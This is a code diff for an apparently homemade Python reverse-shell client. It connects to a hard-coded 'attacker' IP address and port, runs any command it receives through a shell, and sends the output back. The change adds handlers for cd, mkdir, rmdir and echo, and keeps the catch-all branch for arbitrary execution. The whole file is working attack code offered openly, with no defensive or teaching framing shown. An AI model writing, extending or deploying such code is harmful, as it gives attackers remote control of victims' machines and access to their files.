@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 attacker_ip = '192.168.1.148'
 attacker_port = 6996
@@ -10,14 +11,37 @@ def get_command():
         command = command.decode()
         if command == 'q':
             break
-        else:
-            if command[:4] == 'echo':
-                msg = "Echo command completed !"
+        elif command[:2] == 'cd' and len(command) > 1:
+            try:
+                os.chdir(command[3:])
+                msg = "Changed directory to " + command[3:]
                 sock.send(msg.encode())
-            else:
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                result = proc.stdout.read() + proc.stderr.read()
-                sock.send(result)
+                continue
+            except:
+                continue
+        elif command[:5] == 'mkdir' and len(command) > 1:
+            try:
+                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                msg = "Make folder successfully !!"
+                sock.send(msg.encode())
+                continue
+            except:
+                continue
+        elif command[:5] == 'rmdir' and len(command) > 1:
+            try:
+                subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                msg = "Remove Directory Successfully !!"
+                sock.send(msg.encode())
+                continue
+            except:
+                continue
+        elif command[:4] == 'echo' and len(command) > 1:
+            msg = command[:5]
+            sock.send(msg.encode())
+        else:
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            sock.send(result)
 
 def connect_to_attacker():
     global sock
